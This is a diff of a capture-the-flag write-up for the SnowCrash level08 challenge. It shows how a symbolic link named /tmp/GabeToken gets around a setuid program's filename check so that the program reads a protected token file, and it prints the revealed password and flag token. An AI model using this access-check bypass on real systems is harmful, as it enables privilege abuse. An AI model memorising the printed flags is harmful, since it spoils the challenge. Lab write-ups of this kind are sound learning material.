@@ -23,17 +23,13 @@ level08@SnowCrash:~$ echo ~/token > /tmp/mytoken; cat /tmp/mytoken && ./level08 
 /home/user/level08/token
 You may not access '/tmp/mytoken'
 
-# So no matter what we can not access the keyname token with program level08
+# So no matter what, we can not access the keyname token with program level08
 
 # Now time to use knowledge gained from nibbler with ln -s for linking files 
-#	token file must be passed to level08, We only need to link the information as level08 has the rights to read the file anyway
-#	It will be done with the code below, We will create a GabeToken that will link to the token and share the same information
-#		This information then can be sent to level08 as it doesn't have the name "token" in it and yes it is case sensetive 
-
-level08@SnowCrash:~$ ln ~/token /tmp/GabeToken; ./level08 /tmp/GabeToken
-ln: failed to create hard link `/tmp/GabeToken' => `/home/user/level08/token': Invalid cross-device link
-
-#		Note the -s is for shared information and will solve the above problem by creating a symbolic link
+#		Note the -s is to make it a symbolic link and will solve the above problem
+#	The token file must be passed to level08, We only need to link the information as level08 has the rights to read the file anyway
+#	It will be done with the code below, We will create a GabeToken that will link to the token and access the same information 
+#		This information then can be sent to level08 as it doesn't have the name "token" in it (yes it is case sensetive)
 
 ln -s ~/token /tmp/GabeToken; ./level08 /tmp/GabeToken
 quif5eloekouj29ke0vouxean
@@ -46,6 +42,10 @@ Don't forget to launch getflag !
 flag08@SnowCrash:~$ getflag
 Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
 
+# What we learnt
+#	The program was hard coded to only ignore any file with the name "token" inside of it name and by using the 
+#		symbolic linking to link token content to our own file (alising the file) so that it will read the token file
+
 Resources
 http://theory.uwinnipeg.ca/UNIXhelp/tasks/links.html
-https://unix.stackexchange.com/questions/233275/hard-link-creation-permissions
+https://unix.stackexchange.com/questions/87200/change-permissions-for-a-symbolic-link
